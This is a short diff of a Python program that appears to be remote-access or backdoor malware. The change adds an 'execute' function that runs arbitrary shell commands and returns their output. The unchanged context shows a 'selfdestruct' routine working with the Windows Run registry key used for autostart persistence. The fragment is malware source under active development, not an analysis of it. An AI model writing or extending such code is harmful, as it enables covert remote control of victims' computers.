@@ -5,16 +5,24 @@
 
 import datetime
 import os
+import subprocess
 import sys
 import urllib
 import zipfile
+
+
+def execute(command):
+    output = subprocess.Popen(command, shell=True,
+             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+             stdin=subprocess.PIPE)
+    return output.stdout.read() + output.stderr.read()
 
 
 def selfdestruct(plat):
     if plat == 'win':
         import _winreg
         from _winreg import HKEY_CURRENT_USER as HKCU
-        
+
         run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
 
         try:
